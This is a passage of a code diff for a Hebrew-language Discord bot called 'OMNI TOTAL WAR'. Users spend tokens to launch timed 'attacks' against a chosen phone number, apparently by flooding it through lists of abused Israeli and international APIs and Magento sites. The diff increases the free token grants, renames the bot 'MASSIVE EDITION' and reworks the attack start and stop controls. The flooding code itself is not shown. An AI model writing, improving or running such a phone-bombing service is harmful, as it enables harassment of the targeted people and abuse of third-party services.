-        bot.active_attacks[attack_id] = False
-    
-    await interaction.response.send_message(f"🛑 עצרתי {len(user_attacks)} מתקפות", ephemeral=True)
+    logging.info(f"✅ Attack ended - Total: {total_sent}")
 
 # ========== ממשק משתמש ==========
 class AttackModal(ui.Modal, title="💣 הפעל מתקפה"):
@@ -677,8 +316,8 @@ class AttackModal(ui.Modal, title="💣 הפעל מתקפה"):
         user_doc = await users_col.find_one({"user_id": user_id})
         
         if not user_doc:
-            await users_col.insert_one({"user_id": user_id, "tokens": 20})
-            user_doc = {"tokens": 20}
+            await users_col.insert_one({"user_id": user_id, "tokens": 50})
+            user_doc = {"tokens": 50}
         
         if user_doc.get("tokens", 0) < 1:
             await interaction.response.send_message("❌ אין לך טוקנים!", ephemeral=True)
@@ -690,7 +329,10 @@ class AttackModal(ui.Modal, title="💣 הפעל מתקפה"):
         bot.active_attacks[attack_id] = True
         
         await interaction.response.send_message(
-            f"🚀 **מתקפה הופעלה!**\n📱 {phone}\n⏱️ {duration} דקות\n💎 נותרו: {user_doc['tokens']-1}",
+            f"🚀 **מתקפה הופעלה!**\n"
+            f"📱 {phone}\n"
+            f"⏱️ {duration} דקות\n"
+            f"💎 נותרו: {user_doc['tokens']-1}",
             ephemeral=True
         )
         
@@ -706,11 +348,18 @@ class MainView(discord.ui.View):
     
     @discord.ui.button(label="🔍 בדוק APIs", style=discord.ButtonStyle.secondary)
     async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await check_apis_function(interaction)  # קורא לפונקציה, לא לפקודה
+        await check_apis_function(interaction)  # קורא לפונקציה ישירות
     
     @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.secondary)
     async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await stop_attacks(interaction)
+        # קורא לפונקציית עצירה ישירות
+        user_id = str(interaction.user.id)
+        stopped = 0
+        for attack_id in list(bot.active_attacks.keys()):
+            if attack_id.startswith(user_id):
+                bot.active_attacks[attack_id] = False
+                stopped += 1
+        await interaction.response.send_message(f"🛑 עצרתי {stopped} מתקפות", ephemeral=True)
 
 @bot.tree.command(name="setup", description="פתח פאנל שליטה")
 async def setup(interaction: discord.Interaction):
@@ -718,16 +367,16 @@ async def setup(interaction: discord.Interaction):
     user_doc = await users_col.find_one({"user_id": user_id})
     
     if not user_doc:
-        await users_col.insert_one({"user_id": user_id, "tokens": 25})
-        tokens = 25
+        await users_col.insert_one({"user_id": user_id, "tokens": 100})
+        tokens = 100
     else:
         tokens = user_doc.get("tokens", 0)
     
     active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
     
     embed = discord.Embed(
-        title="⚡ OMNI TOTAL WAR - ULTIMATE",
-        description=f"**{len(MAGENTO_SITES)}** מג'נטו + **{len(ISRAELI_APIS)}** APIs ישראלים",
+        title="⚡ OMNI TOTAL WAR - MASSIVE EDITION",
+        description=f"**{len(WORKING_APIS)}** APIs (ישראלים + בינלאומיים)",
         color=0x00ff00
     )
     embed.add_field(name="💎 הטוקנים שלך", value=f"**{tokens}**", inline=True)
@@ -744,5 +393,5 @@ async def tokens(interaction: discord.Interaction):
     await interaction.response.send_message(f"💎 **הטוקנים שלך:** {tokens}", ephemeral=True)
 
 if __name__ == "__main__":
-    logging.info("🚀 Starting OMNI TOTAL WAR ULTIMATE...")
+    logging.info("🚀 Starting OMNI TOTAL WAR MASSIVE EDITION...")
     bot.run(TOKEN)
